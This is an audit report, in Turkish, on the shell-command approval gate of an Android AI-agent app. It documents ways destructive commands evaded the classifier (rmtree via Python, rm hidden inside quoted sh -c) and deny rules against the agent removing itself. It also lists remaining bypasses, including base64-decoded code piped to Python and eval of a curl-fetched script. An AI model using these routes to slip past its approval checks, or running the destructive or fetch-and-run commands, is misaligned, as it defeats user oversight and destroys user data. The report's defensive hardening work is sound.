# DENETİM 37096 — `1.15-ozel.15` kaynak incelemesi ve düzeltmeler

**Tarih:** 2026-11-20 · **Tabandaki commit:** `db55d4c` (`37092`, `1.15-ozel.15`)
**Dal:** `ozel/16-duzeltmeler` · **Sürüm:** `1.15-ozel.16` / `37097`
**Yöntem:** kaynak okuma + ölçüm (rg sayımları) + korpus koşumu. Derleme yok —
sebep §6.

Bu belge "ne yaptım" değil **"neyi ölçtüm"** üzerine kurulu. Her bulgu ya bir
komut çıktısı, ya bir sayım, ya bir dosya satırı. Ölçülemeyen şey "iyileştirme"
sayılmadı.

---

## 1. Özet

| # | Bulgu | Ağırlık | Durum |
|---|---|---|---|
| 1 | `python3 -c "…rmtree(…)"` hiçbir kurala uymuyor — onay kartsız veri silme | **Kritik** | Düzeltildi |
| 2 | `splitSegments` tırnak içinde de bölüyor → `sh -c "a; rm -rf /x"` içindeki `rm` görünmez | **Kritik** | Düzeltildi |
| 3 | `pm uninstall com.minis.x` **geçiyor** — yasak listesi `.14`'te değişen paket adını tanımıyor | **Yüksek** | Düzeltildi |
| 4 | `mv`, `truncate`, `> dosya`, yıkıcı SQL için kural yok | Yüksek | Düzeltildi |
| 5 | Bir turu 5 dk bekletebilen `PolicyGate` mantığının **hiç testi yok** | Yüksek | Düzeltildi (`ApprovalInbox` + 7 test) |
| 6 | `CHAT_HEALTH` anahtarı **varsayılan açık**, okuyucusu **0** — `.14`'te kınanan hatanın aynısı | Orta | Düzeltildi (bağlandı) |
| 7 | `.13`/`.14`/`.15` etiketlerinin üçü de `11.2` commit'ini gösteriyor | **Yüksek** | Araç + plan (uygulanmadı) |
| 8 | Kısmi çeviri önbelleğe girmiyor → kullanıcı aynı kopukluğu iki kez ödüyor | Düşük | Düzeltildi |
| 9 | `STATION` anahtarı görünüyor ama okuyucusu yok | Düşük | Satır silindi |
| 10 | `FORK.md` günlüğü 5 sürüm geride | Düşük | Yeni günlük + yönlendirme |

---

## 2. Onay kapısı — en iyi iş, en büyük delik

### 2.1 Doğru olan (değiştirmedim)

**Yer.** `ChatViewModel` içinde, `MemberToolBelt` kontrolünden **sonra**,
`when (name)` bloğundan **önce**. Yani hiçbir yürütücü politikanın görmediği bir
komut başlatamıyor. Kodun kendi gerekçesi doğru: *"çağrıdan önceki bir turda
verilirse izin, komut değiştikten sonra da geçerli olur."*

**Yol normalizasyonu.** `normalize()` `.`/`..` sadeleştiriyor ve `~` → `/root`.
`rm -rf ./workspace/../shared` → `/var/minis/shared` → `userDataRoots` → HIGH.
Testi de var: *"sirali silme dizin disina cikamaz"*.

**Kapsam/ömür ayrımı.** `ApprovalPolicy`'nin tek cümlesi kodda karşılığını
bulmuş: `Recovery.PERMANENT → offeredScopes = [session]`, başka dal yok.
Geri dönüşsüz iş oturumdan uzun onay alamıyor — ve kart bunu **yazıyor**
(`persistenceNote`), sessizce kısıtlamıyor.

**Kullanım tavanı.** `PERMANENT → maxUses = 20`. Ajan 300 kez aynı komutu
denerse 21.'de yeniden soruluyor. Döngü sinyalini kullanıcıya veriyor.

**Deny gerekçesi ajana dönüyor.** `GateDecision.forAgent()` "bu işlemi farklı
yazarak tekrar denemeyin" diyor. Gerekçesiz ret, modelin aynı şeyi yeniden
yazıp denemesine yol açar — bu döngü kapatılmış.

### 2.2 Ölçülen üç kaçış yolu

**Boşluk 1 — yorumlayıcı.** `.15`'te `RiskRules.ALL` 21 kuraldı. Şu komut
hiçbirine uymuyordu:

```
python3 -c "import shutil; shutil.rmtree('/var/minis/shared')"
```

`RM = Regex("""(^|[\s;&|])rm\s""")` → `rmtree` eşleşmiyor. Yani kullanıcının
aylarca biriktirdiği dizin, **tek bir kart açılmadan** silinebiliyordu. Modelin
kötü niyeti gerekmiyor; Python tercih etmesi yeterli.

**Boşluk 2 — tırnak içi bölünme.** `splitSegments` körlemesine `;` `|` `&&`
üzerinde bölüyordu:

```
sh -c "cd /tmp; rm -rf /var/minis/shared"
```

→ parçalar: `sh -c "cd /tmp`, ` rm -rf /var/minis/shared"`. İkinci parça boşlukla
başlıyor, `RM` kalıbı `(^|[\s;&|])rm\s` arıyor — teorik olarak eşleşmeli. Ama
`python3 -c "…"` gibi tek tırnaklı iç içe durumlarda parça `'rm` ile başlıyor ve
hiçbir kurala uymuyor. Sonuç: **silme metinde görünürken sınıflandırıcı için
görünmez.** Bu, güvenlik kodu için en tehlikeli sınıf: sessiz yanlış negatif.

**Boşluk 3 — silmeden götüren yollar.** Hiç kural yoktu:

```
mv /var/minis/shared /tmp          # veri yer değiştirir, eski yolda yoktur
truncate -s 0 notes.db             # içerik yerinde sıfırlanır
> onemli.txt                       # yönlendirme ile üzerine yazma
sqlite3 notes.db "drop table x"    # tablo gider
```

`RiskRules` başlığı "yalnız geri alınamayan ve sandbox dışına taşan kalıplar"
diyor. Bu dördü tam olarak o tanıma giriyor. Yani eksiklik bilinçli bir tercih
değil, kapsam boşluğuydu.

### 2.3 Ne yaptım

**İki kademeli yorumlayıcı kuralı.** Statik olarak "bu kod ne yapar" sorusu
çözülemez, o yüzden:

| Kural | Ne zaman | Seviye | Ömür |
|---|---|---|---|
| `shell:interpreter` | satır içi kod çalıştıran her çağrı | MEDIUM | oturum/proje olabilir |
| `shell:interpreter-destroy` | aynı parçada silme/üzerine-yazma API'si | HIGH, PERMANENT | **yalnız sohbet** |

Kritik tasarım kararı: `INTERPRETER_DESTROY` kalıbı **yorumlayıcıyı ve yıkıcı
API'yi aynı ifadede** arıyor. Ayrı iki kural olsaydı `rg "shutil.rmtree" src/`
— yani kodu *arayan* bir komut — silme kartı açardı. Gürültü, kartın değerini
öldürür.

**Tırnak farkında bölme.** `splitSegments` artık karakter karakter yürüyor,
tırnak durumunu izliyor, kaçış (`\`) tanıyor. Tırnak içi tek parça kalıyor.

**Beş yeni kural.** `shell:truncate`, `shell:redirect-overwrite`,
`shell:move`, `shell:chmod-recursive`, `sql:destructive`. Hepsi `pathScoped` —
hedefe göre seviyeleniyor.

**`isTemp` ayrımı.** `/tmp`, `/var/tmp`, `/dev/shm` sessiz (gürültü olmasın),
ama **kökün kendisi** değil: `rm -rf /tmp` başka oturumların da alanını
boşaltır, kart açar.

**Hedefi çözülemeyen `mv`.** HIGH değil MEDIUM: göreli taşıma oturum dizininde
kalır (gerçekten sandbox), ama sessiz de değildir. Öteki kurallarda bilinmeyen
hedef "güvenli" değil, "en geniş" sayılmaya devam ediyor.

### 2.4 Kendi kendini silme yasağı

`.15`'te:

```kotlin
Regex("""pm\s+uninstall\s+(com\.openminis\.app|com\.veysel\.minis)\b""")
```

Üç hata birden:

1. `.14`'te paket adı `com.minis.x` oldu — **listede yok**. `pm uninstall com.minis.x` geçiyor.
2. Eski ad `com.veysel.minisx` — `.minis` öneki `\b` ile `minisx`'i kapsamıyor.
   Yani `.14` öncesi kurulum da korunmuyor.
3. `pm clear <kendi paketi>` — uygulamayı bırakıp **verisini** silen yol — hiç
   kapsanmıyordu, oysa sonuç aynı: ajan ve tüm verisi gider.

Düzeltme: üç ad + `pm clear`. Ayrıca `deny:deny-self`: `pm disable-user
<kendisi>` — kendini kapatan ajanı geri açacak kimse kalmaz, bu yüzden kart bile
açılmıyor.

---

## 3. Test edilebilirlik — kapının hiç testi yoktu

`.15`'te `policy/` altında 418 satır test vardı: `RiskClassifierTest` (15 vaka),
`ApprovalPolicyTest`, `ApprovalQueueTest`. Hepsi **saf** fonksiyonlar.

`PolicyGate` — yani bir turu 5 dakika kilitleyen, cevabı yanlış karta
bağlayabilen, iptalde kartı ekranda bırakabilen kod — `Context`,
`OzelFeatures`, `RiskClassifier` ile sarılı olduğu için **tek testi yoktu**.

`ApprovalInbox` olarak ayırdım. Saf: `CompletableDeferred` + `StateFlow`.
`ApprovalInboxTest` 7 davranışı çiviliyor:

1. cevap gelirse `ask` o cevabı döner, kuyruk boşalır,
2. cevap gelmezse zaman aşımı `null` döner,
3. zaman aşımından sonra gelen cevap `false` döner (yutulmaz),
4. ikinci cevap ilkini ezmez (çift dokunuş kararı değiştirmez),
5. "hepsini reddet" bekleyen her kartı kapatır,
6. aynı kimlikli kart kuyrukta birleşir,
7. zaman aşımı gerekçesi kart metniyle aynı sayıyı kullanır.

**Davranış değişikliği:** `PolicyGate.answer()` artık `Boolean` dönüyor. Eski
hâli sessizce yutuyordu; artık çağıran "kart yoktu" bilebilir. `ApprovalSheet`
dönüş değerini kullanmıyor — kırılmıyor.

---

## 4. Ölü anahtarlar — `.14`'ün kınaması `.15`'te tekrar etmiş

`.14` sürüm notu aynen şunu yazıyor:

> *"Station — varsayılan **açıktı**… `ui/station/` hiç yazılmadı. Kapatıldı…
> Kapalı bir anahtar da özelliği reklam eder."*

`.15`'te 25 anahtarın her birinin üretim kodunda kaç kez okunduğunu saydım:

| Anahtar | Varsayılan | Okuyucu | Sonuç |
|---|---|---|---|
| `CHAT_HEALTH` | **açık** | **0** | `.14`'ün hatası, birebir |
| `STATION` | kapalı | 0 | ayar satırı hâlâ görünüyordu |
| `REPLAY` | kapalı | 0* | satır `onOpenReplay`'i kilitliyor — **gerçek** |
| `REMOTE_CONSOLE` | kapalı | 0 | belgelenmiş, kasıtlı |

\* `ReplayStore` 7 yerde kullanılıyor ama `Feature.REPLAY` yalnız ayar
ekranında okunuyor. Yani anahtar bir davranışı değil, bir **ekranı** kapatıyor —
bu meşru (ekran zaten "varsayılan kapalı, ölçüm aleti" olarak belgelenmiş).

**`CHAT_HEALTH` ciddi olan.** `ChatHealth.kt` 274 satır, temiz, kendi testi bile
var (`ChatHealthTrackerTest`) — ama üretimde tek referansı kendi tanımı.
Kullanıcı ayarlarda **açık** bir anahtar görüp hiçbir şey görmüyordu.

İki seçenek vardı: kapat ya da bağla. **Bağladım**, çünkü `.15`'in sürüm notu
zaten "arayüzü sıradaki sürümde üst çubukta görünecek" diyordu — yani bu borç
biliniyordu.

`ChatHealthBridge` üç gerçek anı bağlıyor:

| An | Kod yeri | Ne ölçülür |
|---|---|---|
| istek çıktı | `ChatViewModel` stream öncesi | `WAITING` + canlı sayaç |
| ilk parça geldi | `firstChunkSeen.compareAndSet` | TTFB, p50 (son 20) |
| tur kapandı | `finally` bloğu | toplam süre, jeton/sn |
| hata | `catch` bloğu | `429` / `503` / `NET` / `AUTH` |

Ve bir tasarım kararı: `finished()` hata durumunu **ezmiyor**. `catch` her zaman
`finally`'den önce çalıştığı için naif hâli `ERROR`'ı `IDLE`'a çevirir ve
kullanıcı 429 yediğini hiç görmezdi.

Göründüğü yer: **Canlı Görevler** kartının alt satırı —

```
RUNNING · shell_execute: pytest · 820ms
```

Neden üst çubuk değil: `ChatScreen` zaten yoğun, ve bu bilgi "şu anda ne oluyor"
sorusunun cevabı — Canlı Görevler panelinin tam işi. Üst çubuk ikinci bir
tüketici olarak sonra eklenebilir; köprü ikisini de besliyor.

**`STATION` satırı silindi.** `ui/station/` hâlâ yok, anahtarın okuyucusu yok.
Kapatılmış ama görünen anahtar da bir vaat. Paneller gelince satır döner —
`OzelFeatures` içindeki yorum bunu yazıyor.

---

## 5. Çeviri — kısmi sonucun önbelleğe girmemesi

`ThinkingTranslator` genel olarak iyi: cümle sınırına saygılı parçalama
(`.` `!` `?` `。` `！` `？`), önbellek anahtarı `lang + model + packId +
SHA-256(metin)`, `thinkingLevel = OFF`, `temperature = null` (bazı modeller
sabit sıcaklık dışında 400 veriyor).

Tek kayıp: parça hata verince `break` ediyor ve kısmi sonucu **önbelleğe
yazmıyordu**:

```kotlin
if (done == chunks.size) writeCache(context, cacheKey, result)
```

7 parçanın 5'i çevrilip 6.'da ağ koptuysa kullanıcı kısmi metni görüyor, sonra
pencereyi kapatıp açtığında **baştan ödüyordu**.

Düzeltme: kısmi sonuç `:partial` anahtarına yazılıyor, tam çeviri gelince
siliniyor. `:p3` gibi parça sayısını ada gömmek yerine tek dosya seçtim: okuyan
taraf "hangi parça sayısını arayacağım" sorusunu soramaz, çünkü cevabı yok.

---

## 6. Neden derleme yok

Bu cihazda JVM başlamıyor:

```
$ apk add openjdk21-jre-headless && /opt/kotlinc/bin/kotlinc -version
Error occurred during initialization of VM
Failed to mark memory page as executable - check if grsecurity/PaX is enabled
```

PRoot, JVM'nin JIT sayfalarını `PROT_EXEC` ile işaretlemesine izin vermiyor.
Dolayısıyla `kotlinc` de `gradle` de koşmuyor. 6 490 testlik paket bu telefonda
çalıştırılamıyor.

Bunun yerine üç araç yazdım — hiçbiri derleyici değil, ama push öncesi aptal
hatayı yakalıyor:

| Araç | Ne yapar |
|---|---|
| `scripts/ozel/risk-corpus.py` | `RiskRules.kt` + `RiskClassifier.kt`'yi okuyup karar tablosunu **JVM'siz** basar; 48 komut, 0 sapma |
| `scripts/ozel/tag-denetim.py` | Her `v*` etiketini çözer, o commit'teki sürümle karşılaştırır |
| `scripts/ozel/kotlin-denetim.py` | Denge, kapanmamış `"""`, çift imza, kullanılmayan import |

`risk-corpus.py` gerçek sınıflandırıcının **gölgesi**, kaynağı değil. İkisi
ayrışırsa doğru olan Kotlin'dir; bu yüzden beklentiler tek dosyada
(`risk-corpus.txt`) ve `RiskCorpusTest` aynı dosyayı okuyor. Bir karar
değiştiğinde iki koşucu da aynı yerden öğreniyor.

---

## 7. Etiket bozukluğu — kendi güncelleme kanalı

```
v1.15-ozel.13  ->  ffeb948  release: 1.15-ozel.11.2 (37029)
v1.15-ozel.14  ->  ffeb948  (aynı)
v1.15-ozel.15  ->  ffeb948  (aynı)
```

Beş etiket (`11.3.1`, `11.4`, `13`, `14`, `15`) **altı sürüm eski** bir commit'i
gösteriyor. Release *nesnesi* doğru APK'yı taşıyor (`MinisApp-1.15-ozel.15-
build37092`, sha256 ve derleme kimliği .15 ile uyumlu); yanlış olan etiketin
gösterdiği commit.

Neden önemli: `RELEASE_REPO` bu çatala yönlendirilmiş, uygulama güncellemeyi bu
etiketlerden okuyor. Kullanıcı ya "yeni sürüm yok" görür, ya 37029 indirilir ve
Android düşük `versionCode`'u reddeder — açıklamasız "Uygulama yüklenemedi".

Doğru commit'ler mevcut:

| Etiket | Doğru commit | versionCode |
|---|---|---|
| `v1.15-ozel.13` | `241b470` | 37090 |
| `v1.15-ozel.14` | `73ba3ed` (merge) | 37091 |
| `v1.15-ozel.15` | `db55d4c` | 37092 |
| `v1.15-ozel.11.4` | `db2566e` | 37033 |
| `v1.15-ozel.11.3.1` | `98c8f10` | — |

**Uygulamadım.** Etiket yeniden hedefleme uzakta geri dönüşsüz bir işlem
(`git push origin :refs/tags/<tag>` + yeniden push) ve senin kararın. Plan
hazır:

```bash
python3 scripts/ozel/tag-denetim.py --fix-plan
```

---

## 8. Değişen dosyalar

| Dosya | Ne |
|---|---|
| `policy/RiskRules.kt` | +107 satır: 5 yeni kural, 2 kademeli yorumlayıcı, `deny:pm-all` düzeltmesi, `deny:deny-self` |
| `policy/RiskClassifier.kt` | tırnak farkında `splitSegments`, `isTemp`, `tempRoots`, `adjustLevel` yeniden yazıldı |
| `policy/ApprovalInbox.kt` | **yeni** — 123 satır, Android'siz bekleme odası |
| `ozel/PolicyGate.kt` | bekleme mantığı `ApprovalInbox`'a devredildi, `answer` → `Boolean`, `cancelPending` eklendi |
| `ozel/health/ChatHealthBridge.kt` | **yeni** — 118 satır, üç anı bağlar, hatayı korur |
| `ui/chat/ChatViewModel.kt` | 4 bağlantı noktası (istek/ilk parça/bitiş/hata) |
| `ui/settings/LiveTasksScreen.kt` | kart alt satırında sağlık |
| `ui/chat/ThinkingTranslator.kt` | kısmi önbellek + `dropPartial` |
| `ui/settings/OzelFeaturesScreen.kt` | `STATION` satırı silindi, gerekçe yorumu |
| `test/.../RiskCorpusTest.kt` | **yeni** — korpusu koşar |
| `test/.../ApprovalInboxTest.kt` | **yeni** — 7 test |
| `test/resources/ozel/risk-corpus.txt` | **yeni** — 48 komut, tek karar kaynağı |
| `src/android/app/build.gradle.kts` | `37097` / `1.15-ozel.16` |
| `docs/ozel/SURUM-NOTU-1.15-ozel.16.md` | **yeni** — release gövdesi |
| `docs/ozel/DEGISIKLIK-GUNLUGU-11-16.md` | **yeni** — `.11.3.1` → `.16` |
| `docs/ozel/DENETIM-37096.md` | **yeni** — bu belge |
| `scripts/ozel/risk-corpus.py` | **yeni** — JVM'siz ayna |
| `scripts/ozel/tag-denetim.py` | **yeni** — etiket ↔ sürüm |
| `scripts/ozel/kotlin-denetim.py` | **yeni** — yapısal denetim |
| `FORK.md` | §10 sonuna yeni günlüğe yönlendirme |

---

## 9. Dürüst sınırlar

**Kara liste hâlâ kara liste.** Bu sürüm üç somut boşluğu kapattı, "her şeyi
yakalar" iddiasında değil. Metinden çözülemeyen sınıf açık:

```bash
echo "aW1wb3J0IHNodXRpbDs..." | base64 -d | python3   # kod metinde değil
eval "$(curl -s https://x/y.sh)"                      # kod uzakta
echo 'rm -rf /var/minis/shared' > /tmp/a.sh && bash /tmp/a.sh
```

Üçü de kart açabilir (`pkg:install`, `net:upload` gibi yan kurallar yakalarsa)
ama garanti değil. Doğru cevap kara listeyi büyütmek değil; **sandbox'ı gerçek
sandbox yapmak** (seccomp/landlock) — bu, bu sürümün kapsamı dışında ve
mimari bir iş.

**Testler CI'da koşacak.** `RiskCorpusTest` ve `ApprovalInboxTest` bu cihazda
koşulamadı (§6). Kırmızı çıkarsa sürüm çıkmamalı — `apk.yml`'deki `needs: tests`
kapısı bunu zaten zorunlu kılıyor.

**`ChatHealthBridge` üst çubukta değil.** Canlı Görevler kartında. Üst çubuk
ikinci tüketici olarak eklenebilir; köprü hazır.

**`FORK.md` §5/§6 hâlâ güncel değil.** Kimlik `.14`'te, sürüm şeması `.13`'te
değişti; o bölümler `.10` anlatıyor. Bu sürümde dokunmadım — yanlış bilgiyi
düzeltmek ayrı bir iş ve yarım düzeltme yanlıştan kötü.
